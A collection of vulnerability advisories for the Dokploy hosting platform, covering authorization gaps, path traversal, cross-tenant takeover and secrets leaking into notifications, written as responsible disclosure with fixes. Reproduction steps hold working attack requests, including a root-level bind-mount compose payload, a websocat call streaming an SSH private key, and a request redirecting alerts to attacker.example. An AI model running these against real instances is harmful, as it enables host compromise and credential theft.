advisories.title: Cross-organization project takeover via `project.update`
advisories.summary:
The `project.update` endpoint lets the caller set `organizationId`. The permission check looks at the project's current organization, and only *after* that does the update write whatever fields were sent, including the new `organizationId`.

So anyone who can update a project can move it into any other organization. There is no approval step on the receiving side, and no transfer feature in the product that this would be part of. The field is simply writable because the update schema accepts every column on the `projects` table.

I verified this on dokploy.com with two free accounts of my own: one API request moved a project from account A's organization into account B's organization. B was never asked. I moved it back afterwards.

## Why it matters

A project in Dokploy contains environments, services, environment variables (secrets), domains, mounts, and schedules. Whoever owns the project's organization can read all of it.

Worse, the services keep their `serverId` after the move. When the new owner deploys or runs commands, they still execute on the **original organization's servers**, using that organization's stored SSH keys. So a stolen project means code execution on someone else's infrastructure.

Two realistic attack paths:

- **Theft:** I get invited into a client's organization as a member with access to one project (a normal contractor setup). I re-point that project to my own organization. I now own it, including every secret and the ability to deploy to the client's servers.
- **Injection:** I push one of my own projects into another organization whose ID I know. It just shows up in their dashboard.

Two details that make this worse than it looks:

- **The victim can't undo it.** Once the project is in another org, the  original org's own `project.update` fails the permission check (the project's org no longer matches). Getting it back requires database access or asking the attacker.
- **The audit log says "update".** It does not record that ownership moved. The project just disappears.

## How to reproduce

1. Account A: create a project. Note its `projectId` (it's in the URL).
2. Account B: get your own organization ID from `GET /api/auth/organization/list`. Share it with A.
3. Account A, in the browser console while active in org A:

   ```js
   fetch("/api/trpc/project.update?batch=1", {
     method: "POST",
     credentials: "include",
     headers: { "content-type": "application/json" },
     body: JSON.stringify({ "0": { "json": {
       "projectId": "<P_ID>",
       "organizationId": "<ORG_B_ID>"
     }}})
   }).then(r => r.json()).then(console.log)
   ```

4. The project now belongs to B's organization. B sees it in the dashboard;
   A no longer does.
5. B can move it back the same way.

advisories.title: Users can overwrite server-managed fields on their own account via `user.update`
advisories.summary:
## What happened

`user.update` lets a user edit their profile, but the update schema is `createSchema.partial()` (`db/schema/user.ts:235`), so every column on the user table is writable, and the router passes the input straight to `updateUser(ctx.user.id, input)` (`routers/user.ts:273`).

Confirmed on dokploy.com: one request set `serversQuantity` to 999 on my own account (reverted afterwards). Fields that should be server-managed are client-writable, including:

- `serversQuantity`: bypasses the plan limit on how many servers you can add
- `expirationDate`: self-extend a trial/subscription
- `banned`: self-unban
- `enablePaidFeatures` / `enableEnterpriseFeatures`: flip feature flags
- `emailVerified`, `stripeCustomerId`, `licenseKey`, `allowImpersonation`, ...

The `role` and `isValidEnterpriseLicense` fields are correctly omitted, so this is not a direct privilege escalation.

The `stripeCustomerId` field makes this more serious. It is the key used to resolve a user's billing identity:

- `getCurrentPlanForUser` (`server/utils/billing.ts:48`) lists active Stripe subscriptions for `customer: stripeCustomerId` on every plan check. Set your account's `stripeCustomerId` to a paying customer's `cus_...`, and your organization resolves to their plan: unlimited servers, unlimited members, no payment.
- Billing-portal sessions are created for that same customer ID, so a spoofed account gets a portal into the victim's Stripe customer: invoices, billing details, payment-method metadata, cancel/modify the subscription.
- Stripe webhooks match users by `stripeCustomerId` (`pages/api/stripe/webhook.ts`), so subscription updates get credited to the wrong account.

Requires knowing the victim's `cus_...` ID (leaks via invoices, emails, support threads). Still worth locking down: it converts a self-scoped field bug into cross-customer billing access.

## How to reproduce

```js
fetch("/api/trpc/user.update?batch=1", {
  method: "POST", credentials: "include",
  headers: { "content-type": "application/json" },
  body: JSON.stringify({ "0": { "json": { "serversQuantity": 999 } } })
})
```

## Suggested fix

Replace `createSchema.partial()` with an explicit `.pick()` of the fields a user may edit (name, email, password, avatar, notification prefs, ...). This is the same pattern as the `project.update` issue reported separately (GHSA-h52x-gwf8-4h58); worth auditing every `*.partial()` update schema for columns that must be immutable.

The backup endpoints check permissions only when the backup is attached to a service. A backup with `databaseType: "web-server"` has no service attached, so the checks are skipped and any member can create and run it.

advisories.title: Missing authorization on all network.* endpoints (Member -> create/delete docker networks on org servers, cross-org access via serverId)
advisories.summary:
## Summary

Every procedure in `networkRouter` is a plain `protectedProcedure` with no permission check (`routers/network.ts`). Any authenticated user, including members with zero docker-related permissions, can create, inspect, recreate, import and delete docker networks.

Verified live: a member account with no permissions called `network.create` and a docker network was created on the server.

## Details

All of these are `protectedProcedure` only:

- `network.all`, `network.networksToSync`, `network.one`, `network.inspect` - read/list
- `network.create`, `network.import`, `network.recreate`, `network.resync` - create/modify
- `network.remove` - delete

Members have no `docker` permission at all (`access-control.ts:179` - `docker: []`), yet all of the above succeed.

`one`, `inspect`, `recreate`, `resync` and `remove` do check `network.organizationId === activeOrganizationId`, so they are limited to the caller's org. `create` and `import` accept an optional `serverId` that is never validated against the org (`network.ts:52-66, 76-98`), and `createNetwork` stores it verbatim then calls `getRemoteDocker(serverId)` (`services/network.ts:289,321`). Within the org this is trivially exploitable since `network.all` returns every serverId to any member. Pointing at another organization's server requires knowing its id (not guessable, but obtainable through other data leaks); the lack of an ownership check is verifiable by targeting a server in an organization the caller controls.

Impact inside the org: a member can delete `dokploy-network` or any service network, which cuts connectivity for every app on it (instance-wide denial of service), or create networks with attacker-chosen driver/IPAM options.

## Steps to reproduce

Tested on a self-hosted install (v0.30.6).

As a member with no permissions:

```
POST /api/trpc/network.create?batch=1
{"0":{"json":{"name":"pwned-net"}}}
```

`docker network ls` on the host shows `pwned-net` (verified: the member's call created the network on the host). `network.all` also returns the full network list to the member, and `network.remove` with the id deletes it again. All calls succeed for a member with no docker permissions.

advisories.title: `ai.deploy` does not validate serverId - members can deploy to other organizations' servers
advisories.summary:
## Summary

`ai.deploy` checks that the caller can create services in the given project, but never checks that `serverId` belongs to the caller's organization. The compose row is stored with whatever `serverId` was sent, and `compose.deploy` then runs the supplied docker-compose on that server.

Tested on dokploy.com: as a member of org B, I passed the `serverId` of a server attached to org A. The compose deployed and ran on org A's host. I bind-mounted `/` and wrote a file to `/tmp` on the host, running as root.

On cloud `serverId` is required, so this is the normal path, not an edge case.

## Details

`routers/ai.ts:341-366`:

```ts
await checkServiceAccess(ctx, environment.projectId, "create");
// serverId never checked against the organization
const compose = await createComposeByTemplate({ ...input, serverId: input.serverId, ... });
```

`createComposeByTemplate` inserts the row as-is (`services/compose.ts:97`). `configFiles` also go to `createMount` with a raw `filePath` that is not confined to the app directory.

Server IDs are not guessable, but they show up in normal API responses (`serverId` is on service/network rows) and in the other missing-authorization endpoints I reported separately.

## Steps to reproduce

Verified on dokploy.com.

1. As a member with service create access on a project in org B:

```
POST /api/trpc/ai.deploy?batch=1
{"0":{"json":{
  "environmentId": "<own environment id>",
  "serverId": "<victim org's server id>",
  "name": "x", "id": "x", "description": "",
  "dockerCompose": "services:\n  app:\n    image: alpine\n    volumes:\n      - /:/host\n    command: [\"sh\",\"-c\",\"id > /host/tmp/pwned\"]",
  "envVariables": ""
}}}
```

2. Call `compose.deploy` on the returned compose. The container runs on the victim's server; with the `/` bind mount, the file lands on the host as root.

## Suggested fix

- Check `serverId` against the caller's organization in `ai.deploy` (worth auditing every endpoint that takes `serverId`, same pattern).
- Reject mount `filePath` values outside the app directory.

advisories.title: Path traversal in `appName` on the `/listen-docker-stats-monitoring` WebSocket lets a low-privileged member create arbitrary directories and write files as root on the Docker host
advisories.summary:
### Summary

The WebSocket endpoint `/listen-docker-stats-monitoring` accepts an `appName` query parameter that is never validated or normalized. It is interpolated directly into a filesystem path that is then passed to `mkdir(..., { recursive: true })` and `writeFile(...)`.

Combined with a missing runtime validation on `appType` and a broken authorization-to-object binding, a low-privileged organization **member** can create directories and write files **as root on the Docker host**, outside the intended `MONITORING_PATH` - including into the directory Traefik watches for dynamic configuration.

The primary defect is a **path traversal (CWE-22)**​; the authorization weakness on this endpoint is reported here as a secondary issue, not as the main claim.

### Details

#### Root cause 1 - `appName` is interpolated into a filesystem path without validation

```ts
// packages/server/src/monitoring/utils.ts:16-23
export const recordAdvancedStats = async (stats: Container, appName: string) => {
    const { MONITORING_PATH } = paths();
    const path = `${MONITORING_PATH}/${appName}`;
    await promises.mkdir(path, { recursive: true });
```

There is no `path.resolve()` containment check, no character whitelist, and no rejection of `..` anywhere between the query parameter and the sink.

#### Root cause 2 - `appType` has no runtime validation, which removes the only implicit constraint on `appName`

```ts
// apps/dokploy/server/wss/docker-stats.ts:92-95, 130-141
const appType = (url.searchParams.get("appType") || "application") as
    | "application" | "stack" | "docker-compose";

const filter = {
    status: ["running"],
    ...(appType === "application"   && { label: [`com.docker.swarm.service.name=${appName}`] }),
    ...(appType === "stack"         && { label: [`com.docker.swarm.task.name=${appName}`] }),
    ...(appType === "docker-compose" && { name: [appName] }),
};
```

`as` is a compile-time assertion only - it does not exist at runtime. Passing any value outside those three literals (for example `appType=bogus`) makes **every** branch false, so the Docker filter degrades to `{"status":["running"]}`, which matches **every running container on the host**.

That degradation is what makes the first root cause fully exploitable: the code only proceeds when a container matches, so with a legitimate `appType` the value of `appName` is implicitly constrained to something that matches a real container name. With a bogus `appType` that constraint disappears and `appName` becomes a completely free-form string.

(`appName=..` alone, with the *legal* `appType=docker-compose`, already traverses one level - Docker's `name` filter matches by substring/regex, so `..` matches some container. The `appType` degradation is what makes traversal arbitrary and depth-independent.)

#### Root cause 3 - the authorization object is not bound to the operated object

The endpoint authorizes on `serviceId` but operates on `appName`/`containerId`, and these are independent query parameters:

```ts
canAccessDockerOverWss(user, session, null, serviceId)
```

`serverId` is hard-coded to `null`, which skips the cross-organization ownership check, and `serviceId` is only checked with `accessedServices.includes(...)`. There is no `appName -> service -> organization` reverse lookup anywhere in the codebase (verified by full-repository search). A member can therefore supply a service they legitimately hold while pointing `appName` at a container - or at the host itself - that they have no rights to.

#### Why the write lands on the host

Removing a member leaves organization API keys active and preserves access
advisories.summary:
## Summary

Removing a member from an organization should terminate that member's organization-scoped API access as well as the interactive membership.

Organization-scoped API keys are attached to the global user and store their organization only as JSON metadata. Removing the user from an organization deletes the membership but neither revokes those keys nor invalidates them during authentication.

`validateRequest()` verifies the key, reads its old `organizationId`, and queries the current membership. When no membership exists, it still creates an authenticated session with that former organization ID and a fallback `member` role. The cookie-session branch correctly clears the active organization in the same situation.

This gives a removed member persistent access to every authentication-only route. In the current release, that includes `settings.getWebServerSettings`, which exposes the stored SSH private key and monitoring token, and `/listen-deployment`, which can stream Dokploy's local SSH private key. The latter remains reachable with the stale key in the WebSocket `x-api-key` header and can yield host-root access where the generated key was authorized for root.

## Details

Organization-scoped API keys are attached to the global user and store their organization only as JSON metadata. Removing the user from an organization deletes the membership but neither revokes those keys nor invalidates them during authentication.

```ts
	getWebServerSettings: protectedProcedure.query(async () => {
		if (IS_CLOUD) {
			return null;
		}
		const settings = await getWebServerSettings();
		return settings;
	}),
```

## Steps to reproduce

1. As an ordinary member, create an API key scoped to the active organization and save its plaintext value.
2. As the organization owner, unlink that member through the normal **Remove member** operation.
3. Confirm the user no longer appears in the organization.
4. Use the old key.

```bash
curl -H 'x-api-key: OLD_KEY' \
  'https://TARGET/api/trpc/settings.getWebServerSettings?input=%7B%22json%22%3Anull%7D'
```

5. The request is still authenticated. An independent proof is a WebSocket handshake with the same header.

```bash
websocat -H 'x-api-key: OLD_KEY' \
  'wss://TARGET/listen-deployment?logPath=/etc/dokploy/ssh/auto_generated-dokploy-local'
```

## Impact

Offboarding does not terminate API access. A former member can retain control-plane access indefinitely and exploit authentication-only secret-disclosure paths. On affected self-hosted configurations, the retained access can lead to host-root SSH compromise.

## Recommendation

Reject API-key authentication unless the key owner still has a membership in the metadata organization. Revoke every key scoped to an organization when that membership is removed, and make organization scope a real foreign-key relationship with cascading revocation.

advisories.title: Notification parent/child ID confusion allows cross-tenant alert and credential hijacking
advisories.summary:
## Summary

An organization administrator may update that organization's notification providers. Authorizing one parent notification must not permit changes to an independently supplied child provider owned by another tenant.

Every notification update accepts two independent global IDs, a parent `notificationId` and a provider-specific child ID such as `slackId`, `gotifyId`, or `teamsId`. The router authorizes only the parent. The service then updates the separately supplied child without verifying that it belongs to the authorized notification or organization.

An attacker can create an attacker-owned notification, pass its authorized parent ID together with another tenant's child ID, and replace the victim webhook, server URL, token, email credentials, or API key. Future deployment, build-error, backup, restart, cleanup, and server-threshold alerts can be redirected to the attacker or suppressed.

There is a second variant on self-hosted installations. Ownership checks for Gotify, ntfy, Mattermost, Lark, Teams, and Pushover run only when `IS_CLOUD` is true. Supplying a foreign parent ID reassigns that notification's `organizationId` to the attacker's active organization, after which `notification.one` returns its stored credentials.

## Details

The router authorizes only the parent ID and then forwards both client-supplied IDs to the update service.

```ts
const notification = await findNotificationById(input.notificationId);
if (notification.organizationId !== ctx.session.activeOrganizationId) {
  throw new TRPCError({ code: "UNAUTHORIZED" });
}

await updateSlackNotification({
  ...input,
  organizationId: ctx.session.activeOrganizationId,
});
```

The service updates the parent and child with independent predicates.

```ts
await tx.update(notifications)
  .set({ ... })
  .where(eq(notifications.notificationId, input.notificationId));

await tx.update(slack)
  .set({ webhookUrl: input.webhookUrl, ... })
  .where(eq(slack.slackId, input.slackId));
```

No query joins the child to the authorized parent. The same pattern affects Slack, Telegram, Discord, Email, Resend, Gotify, ntfy, Mattermost, Custom, Lark, Teams, and Pushover updates.

For six provider types, the parent ownership check is additionally limited to Dokploy Cloud. On self-hosted installations the foreign parent is accepted.

```ts
if (IS_CLOUD && notification.organizationId !== activeOrganizationId) {
  throw new TRPCError({ code: "UNAUTHORIZED" });
}
```

## Steps to reproduce

1. As an administrator of Organization A, create a notification and record its parent `notificationId`.
2. Obtain Organization B's provider child ID, for example its `gotifyId`, through a separate disclosure or prior access. `notification.all` is scoped to the active organization, and the reviewed routes do not give an unrelated Organization A administrator a way to enumerate Organization B's child nanoids.
3. Combine the attacker-owned parent ID with the victim child ID in one update request.

```http
POST /api/trpc/notification.updateGotify?batch=1 HTTP/1.1
Host: TARGET
Content-Type: application/json
Cookie: better-auth.session_token=ATTACKER_SESSION

{"0":{"json":{
  "notificationId": "ATTACKER_PARENT_ID",
  "gotifyId": "VICTIM_GOTIFY_ID",
  "serverUrl": "https://attacker.example",
  "appToken": "attacker-token"
}}}
```

4. The parent authorization succeeds because `ATTACKER_PARENT_ID` belongs to Organization A. The service updates `VICTIM_GOTIFY_ID` anyway.
5. Trigger any alert enabled on the victim notification and observe it sent to the attacker's Gotify endpoint.

## Impact

An attacker can redirect or suppress another tenant's operational and security alerts. Redirected messages disclose application and project names, deployment status, build failures, backup status, server names, resource thresholds, and operational timing. On self-hosted instances, the second variant can reparent affected notificatio...

advisories.summary:
### Summary

Database, Compose and volume backups pass the S3 destination credentials to rclone as command-line flags. When the backup command fails, Node.js puts the full command in error.message, and Dokploy sends this message unredacted to every enabled notification channel (email, Slack, Discord, Telegram, webhook...). Anyone who can read the channel gets the access key and secret key of the backup destination, which usually holds every database backup of the instance. The web server backup already redacts this message, the other backup types do not.

### Details

Affected version: branch canary, commit e0c8d80cdea15a4ac3fe495a6ad38e043b4b80b5 (17 October 2026). The Dokploy image runs Node.js 24.4.0.

Credentials on the command line:
- packages/server/src/utils/backups/utils.ts, lines 71 to 81: getS3Credentials() returns --s3-access-key-id=<key> and --s3-secret-access-key=<secret>.
- packages/server/src/utils/backups/utils.ts, line 268: rclone rcat ${rcloneFlags.join(" ")} ... is embedded in the backup command.
- packages/server/src/utils/volume-backups/backup.ts, lines 79 to 83 and 102: same flags in the volume backup command.

When the command fails, execAsync (packages/server/src/utils/process/execAsync.ts, line 45) throws ExecError("Command execution failed: " + error.message). With child_process.exec, Node.js builds error.message as "Command failed: <full command>\n<stderr>" (Node.js v24.4.0, lib/child_process.js, line 417), credentials included.

The catch blocks send this message unredacted to the notification channels:
- packages/server/src/utils/backups/compose.ts, lines 64 to 73 (errorMessage: error?.message)
- packages/server/src/utils/backups/postgres.ts, line 70
- packages/server/src/utils/backups/mysql.ts, line 67
- packages/server/src/utils/backups/mariadb.ts, line 69
- packages/server/src/utils/backups/mongo.ts, line 67
- packages/server/src/utils/backups/libsql.ts, line 70
- packages/server/src/utils/volume-backups/utils.ts, line 182

The notification senders put errorMessage in the message body (for example packages/server/src/utils/notifications/database-backup.ts, line 87 for email and Resend, lines 157 to 161 for Discord, lines 188, 203 and 213 for the other channels).

The web server backup already does the right thing: packages/server/src/utils/backups/web-server.ts, lines 137 to 150, passes the error through redactRcloneCredentials() (packages/server/src/utils/backups/redact.ts) before notifying. The compose catch block also logs the raw error with console.log(error) (compose.ts, line 65), so the secret also reaches the Dokploy service logs.

Suggested fix:
1. Redact before notifying, as web-server.ts already does, in every backup and volume backup catch block:

The secret then appears neither in error messages, nor in ps output on the host, nor in the deployment logs.

advisories.title: Failed builds and backups send every application secret in plain text to notifications
advisories.summary:
### Summary

When a Railpack build fails, Dokploy sends the full build command to every notification channel. That command holds every environment variable of the application as `export NAME=value`. So one failed build sends all application secrets in plain text to email, Slack, Discord, Telegram or a webhook.

Failed database backups do the same with the database password and the S3 destination keys. Dokploy also writes the same text to its own container log.


### Details

I saw this on v0.30.9 and read the same code in v0.30.10. I checked the Railpack builder and the database backups. I did not check the Nixpacks builder.

How the secrets get into the command:

1. packages/server/src/utils/builders/railpack.ts: for each environment variable, the builder adds `export NAME=<value>` to the bash command. It also passes each variable to `railpack prepare` as `--env NAME=value`.
2. packages/server/src/utils/backups/utils.ts: `getS3Credentials` puts `--s3-access-key-id` and `--s3-secret-access-key` on the rclone command line.
3. `getMongoBackupCommand` puts the database password in `docker exec -e DB_PASS=<value>`.

How the command gets into notifications and logs:

1. packages/server/src/utils/process/execAsync.ts: on failure, `ExecError` gets the message `Command execution failed: ${error.message}`. Node's `error.message` starts with `Command failed:` and the full command.
2. packages/server/src/services/application.ts: the catch block sends `errorMessage: error?.message` to `sendBuildErrorNotifications`. Compose deploys do the same.
3. packages/server/src/utils/backups/mongo.ts and postgres.ts: the catch block logs the error and sends `errorMessage: error?.message` to `sendDatabaseBackupNotifications`.
4. The Dokploy container log also gets the error with the full command.

Suggested fix:

1. Keep secret values out of command strings. Pass them in the `env` option of exec, or in temporary files with `--secret id=NAME,src=<file>`.
2. Do not put the command in notification text or in logs. Send the exit code and the last lines of stderr, with known secret values removed.
3. Give rclone its keys through `RCLONE_CONFIG_*` environment variables, not flags.


### Proof of concept

1. Install Dokploy v0.30.10 on a test server.
2. In Settings > Notifications, add a notification (for example Discord or Email) with "App Build Error" on.
3. Create an application from a small Node.js repository. Set the build type to Railpack.
4. Add the environment variable `CANARY_SECRET=canary-1234`.
5. Make the build fail. For example, set the `build` script in package.json to `exit 1`.
6. Deploy the application.

Result: the build-error notification contains `export CANARY_SECRET='canary-1234'`. It also contains every other variable of the application. On the server, `docker service logs dokploy` shows the same text.

Backups use the same code path: a failed MongoDB backup to an S3 destination sends the database password and the S3 keys in its notification. I did not run the backup test.


### Impact

This is an exposure of sensitive information. It affects every instance that has a notification with "App Build Error" or "Database Backup" on. A normal build failure is enough, so no attacker action is needed.

Notification channels are third-party systems. Email providers, Slack, Discord and Telegram store the messages, and more people can read them than can read the Dokploy server. The secrets also stay in the Dokploy container log.

On 2026-10-23, one failed build sent all 14 secrets of a production application to my email through Resend. I had to rotate all of them, including database passwords, OAuth secrets, payment tokens and an encryption key.

advisories.title: Member API key can list all containers and read logs of any container on the server via compose.readLogs
advisories.summary:
## Summary

A user with the `member` role, restricted to a single project and service, can read the logs of any container on the same Docker host. That includes containers of other projects and Dokploy's own service containers. Two authorization gaps combine:

1. `compose.readLogs` authorizes the caller against `composeId`, but never checks that `containerId` belongs to that compose.
2. `docker.getContainersByAppNameMatch` only requires `service: read`, which every `member` has by default. It does not limit results to services the member can access, so it returns container ids and names for other projects.

## Affected code (canary)

- `apps/dokploy/server/api/routers/compose.ts`, `readLogs` (around lines 1219-1256): `checkServiceAccess(ctx, input.composeId, "read")` runs, then `getContainerLogs(input.containerId, ...)` is called with the caller-supplied id.
- `apps/dokploy/server/api/routers/docker.ts`, `getContainersByAppNameMatch` (around line 230): `withPermission("service", "read")` with no per-service check on the result.

## Reproduction

Confirmed on a self-hosted v0.30.10 instance that I operate, using only my own projects.

1. As owner, create a user with the `member` role. Grant only `canAccessToAPI`, and set `accessedProjects`, `accessedEnvironments` and `accessedServices` to one project that has at least one compose service. Leave `canAccessToDocker` off.
2. Sign in as that user and create an API key.
3. Confirm the scope works elsewhere. With that key, `GET /api/project.all` returns only the assigned project, and `GET /api/compose.one` for another project's compose, `GET /api/docker.getContainers`, `GET /api/server.all` and `GET /api/user.all` all return 401.
4. List foreign containers. `GET /api/docker.getContainersByAppNameMatch?appName=<substring>` returns 200 with the `containerId`, `name` and `state` of containers from other projects, and of Dokploy itself with `appName=dokploy`.
5. Read their logs. `GET /api/compose.readLogs?composeId=<own compose id>&containerId=<foreign container id>&tail=5` returns 200 with that container's log output.

I verified step 5 against containers of three other projects and against a Dokploy service container. I requested small tails, recorded only response sizes, and did not read the log contents.

## Impact

Cross-project confidentiality break for any `member`, and for any API key or AI agent acting as one. Application logs often contain secrets, tokens, personal data and internal URLs, and Dokploy's own logs may expose platform details. This defeats per-project API keys as an isolation boundary for logs, even though settings, environment variables and deployments are correctly refused. The issue is read-only: I did not find a way to change foreign containers through these two endpoints.

## Suggested fix

- In `compose.readLogs`, resolve the compose's containers on the server side and reject a `containerId` that is not among them, for example by checking the `com.docker.compose.project` label against the compose `appName`. Apply the same check to any other endpoint that takes a caller-supplied container id.
- In `docker.getContainersByAppNameMatch`, require `docker: read` for arbitrary lookups, or take a service id and check it with `checkServiceAccess`, deriving `appName` from that service instead of accepting it from the caller.

Please keep this report private until a fix is released. I can retest a fix on my instance.

advisories.title: Cross-organization API key via better-auth /api/auth/api-key/create (client-set metadata.organizationId)
advisories.summary:
## Summary

The better-auth `apiKey` plugin's own HTTP endpoint `POST /api/auth/api-key/create` is enabled. It accepts client-supplied `metadata`, and Dokploy trusts `metadata.organizationId` to pick the organization context for the key. The tRPC wrapper `user.createApiKey` checks that the caller is a member of that organization; the native endpoint does not. Any authenticated user can mint a key bound to an organization they do not belong to. `validateRequest` then builds a session with `activeOrganizationId` set to that organization and `role` defaulting to `"member"` even though no membership row exists. Every `protectedProcedure` that scopes data only by `ctx.session.activeOrganizationId` then serves the foreign organization's data.

## Affected version

- Verified on: Dokploy v0.30.10 (self-hosted)
- Code unchanged on `canary` at d64ebedd0

## Code

- `packages/server/src/lib/auth.ts:488-491`: `apiKey({ enableMetadata: true, references: "user" })`, and `/api-key/*` is not in `disabledPaths` (`auth.ts:73-83`).
- `packages/server/src/lib/auth.ts:592-635`: `organizationId` taken from key metadata; `member` lookup may return null; `role: member?.role || "member"` (line 634) and `activeOrganizationId: organizationId` are set regardless.
- Example data endpoint: `apps/dokploy/server/api/routers/tag.ts:50-57` (`tag.all`, `protectedProcedure`, filters only by `activeOrganizationId`).

- Attacker has any account on the instance (here: a plain member of organization B only).
- Attacker knows the victim organization id (org ids are not secret in the sense of being access-controlled; how hard they are to obtain was not assessed).

## Reproduction (local test instance only)

```
# user B: member of "E2E Second Org" only, not a member of "My Organization" (<orgA>)
curl -s -b memberB.jar -H "origin: http://127.0.0.1:13000" -H 'content-type: application/json' \

curl ... -d '{"name":"x","metadata":{"organizationId":"<orgA>"}}' http://127.0.0.1:13000/api/user.createApiKey
```

advisories.title: "Access to API" permission not enforced server-side in user.createApiKey
advisories.summary:
## Summary

The per-member "Access to API" toggle (`canAccessToAPI`, resolved as `api: ["read"]`) only hides the API keys UI. `user.createApiKey` is a plain `protectedProcedure` with no permission check, and API-key authentication does not check `api: read` either. A member whose admin has explicitly denied API access can still mint a non-expiring API key and use it.

## Affected version

- Verified on: Dokploy v0.30.10 (self-hosted)
- Code unchanged on `canary` at d64ebedd0

## Code

- `apps/dokploy/server/api/routers/user.ts:757-783` (canary): `createApiKey: protectedProcedure`, only checks membership of `metadata.organizationId`.
- `packages/server/src/lib/auth.ts:557-641`: `validateRequest` accepts any valid key; no `api: read` check.
- `api.read` is only consulted in the UI: `apps/dokploy/pages/dashboard/settings/profile.tsx:23`, `apps/dokploy/pages/swagger.tsx:103`.

## Preconditions

- Attacker is a `member` of an organization with "Access to API" disabled (the default for new members).

## Reproduction (local test instance only)

```
# as the member (session cookie); user.getPermissions shows api: {"read": false}
curl -s -b member.jar -H "origin: http://127.0.0.1:13000" -H 'content-type: application/json' \
  -d '{"name":"test","metadata":{"organizationId":"<member org id>"}}' \
  http://127.0.0.1:13000/api/user.createApiKey
# -> {"id":"...","key":"<key>","enabled":true,"expiresAt":null,...}

curl -s -H "x-api-key: <key>" http://127.0.0.1:13000/api/user.get
# -> member record, role "member"
```

## Observed result

- `user.getPermissions` for the member: `api: {"read": false}`.
- `user.createApiKey` succeeded and returned a key with `expiresAt: null`.
- The key authenticated REST calls with the member's permissions (e.g. `user.get`, `server.getServerMetrics`).
- After the member signed out (session cookie now returns Unauthorized), the key still worked.

## Impact

- An admin cannot actually prevent a member from getting programmatic API access.
- The member obtains a long-lived credential that is independent of their session. Using it does not go through the 2FA challenge.
- Not tested: whether turning the toggle off revokes existing keys. From the code, it does not, since `validateRequest` never consults it.

## Suggested fix (tested)

In `user.createApiKey`, after the existing membership check, require `api: read` in the organization the key is bound to (not the caller's active organization, since the key's org comes from `metadata.organizationId`). Owners/admins and members with "Access to API" enabled keep working.

Patch against `canary` d64ebedd0:

```diff
diff --git a/apps/dokploy/server/api/routers/user.ts b/apps/dokploy/server/api/routers/user.ts
index 576548737..218c05ec1 100644
--- a/apps/dokploy/server/api/routers/user.ts
+++ b/apps/dokploy/server/api/routers/user.ts
@@ -34,6 +34,7 @@ import {
 	user,
 } from "@dokploy/server/db/schema";
 import {
+	checkPermission,
 	hasPermission,
 	resolvePermissions,
 } from "@dokploy/server/services/permission";
@@ -772,6 +773,14 @@ export const userRouter = createTRPCRouter({
 						message: "You are not a member of this organization",
 					});
 				}
+
+				await checkPermission(
+					{
+						user: ctx.user,
+						session: { activeOrganizationId: input.metadata.organizationId },
+					},
+					{ api: ["read"] },
+				);
 			}
 
 			const apiKey = await createApiKey(ctx.user.id, input);
```

Verified by building `canary` d64ebedd0 with this patch (together with the fixes from my other reports) and upgrading the vulnerable test instance in place. Typecheck passes for `packages/server` and `apps/dokploy`; the vitest suite shows the same 7 failures with and without the change.

After the fix: the member with "Access to API" off gets `UNAUTHORIZED` from `user.createApiKey`; the owner still creates keys.

Not included in this patch: enforcing `api: read` in `validateRequest`, so revoking the toggle does not disable keys that already exist. Worth considering, but it...

advisories.title: Missing authorization on deployment.killProcess/readLogs/removeDeployment and host-level schedule reads (cross-organization)
advisories.summary:
## Summary

For deployments that belong to a host-level schedule (`scheduleType: "dokploy-server"`, i.e. no `applicationId`/`composeId` and no `schedule.serverId`), `deployment.killProcess` performs no authorization check. Any authenticated user of any organization who knows the `deploymentId` can make the Dokploy server run `kill -9 <stored pid>` on the Dokploy host. The same gap in `schedule.one` and `deployment.allByType` lets that user read the host schedule (including its script) and its deployments, which discloses the `deploymentId`.

## Affected version

- Verified on: Dokploy v0.30.10 (self-hosted)
- Code unchanged on `canary` at d64ebedd0

## Code (canary)

- `apps/dokploy/server/api/routers/deployment.ts:212-242`: `killProcess` checks access only when `applicationId || composeId` or `schedule.serverId` is set; otherwise falls through. It also does not check `deployment.status`, so the stored pid is killed even after the deployment finished.
- `apps/dokploy/server/api/routers/deployment.ts:132-153`: `allByType` with `type: "schedule"` has the same fall-through.
- `apps/dokploy/server/api/routers/schedule.ts:288-313`: `schedule.one` only checks `schedule: ["read"]` (granted to members) and an org check for `scheduleType === "server"`; `dokploy-server` schedules are not org-checked, although `schedule.list` restricts them to owner/admin (`schedule.ts:238-249`).
- pid source: `packages/server/src/services/schedule.ts:202` and `packages/server/src/utils/schedules/utils.ts:154-166`.

## Preconditions

- Victim org has a host-level ("Dokploy server") schedule. Creating these is owner/admin only.
- Attacker is a plain `member` of a different organization on the same instance (or the same org; members cannot list host schedules).
- Attacker knows the `scheduleId` or `deploymentId` (nanoid). I did not find an enumeration path; the reads below disclose the `deploymentId` once the `scheduleId` is known.

## Reproduction (local test instance only)

1. As owner of org A: create a host schedule with script `sleep 600` and run it (`schedule.create` with `scheduleType: "dokploy-server"`, then `schedule.runManually`). Inside the Dokploy container: `26321 bash -c ./script.sh`, `26322 sleep 600`.
2. As a plain member of org B (not a member of org A):

```
curl -s -b memberB.jar -H "origin: http://127.0.0.1:13000" \
  "http://127.0.0.1:13000/api/schedule.one?scheduleId=<scheduleId>"
# -> full schedule of org A, incl. "script":"sleep 600", "organizationId":"<orgA>"

curl -s -b memberB.jar -H "origin: http://127.0.0.1:13000" \
  "http://127.0.0.1:13000/api/deployment.allByType?id=<scheduleId>&type=schedule"
# -> [{"deploymentId":"<id>","status":"running","logPath":"/etc/dokploy/schedules/...", ...}]

curl -s -b memberB.jar -H "origin: http://127.0.0.1:13000" -H 'content-type: application/json' \
  -d '{"deploymentId":"<id>"}' http://127.0.0.1:13000/api/deployment.killProcess
# -> 200, empty body
```

## Observed result

- After the call, pid 26321 (`bash -c ./script.sh`) was gone and the deployment status changed to `error`. (The `sleep` child survived because only the parent pid is killed.)
- Calling `killProcess` again on the finished deployment executed `kill -9 26321` again: `Command failed: kill -9 26321 ... No such process`. There is no status check, so a stale pid is killed whenever this is called.
- Control: member B calling `schedule.list` with `scheduleType: "dokploy-server"` gets `403 Only owners and admins can list host-level schedules`.

## Additional affected procedures (found while fixing)

`deployment.readLogs` and `deployment.removeDeployment` have the same fall-through as `killProcess`: they check access only when the deployment has `applicationId`/`composeId` or `schedule.serverId`, and otherwise do nothing. Deployments that only carry a parent id fall through: host schedules, but also deployments of application/compose schedules (they store only `scheduleId`), backups, volume backups, preview deployments and server...

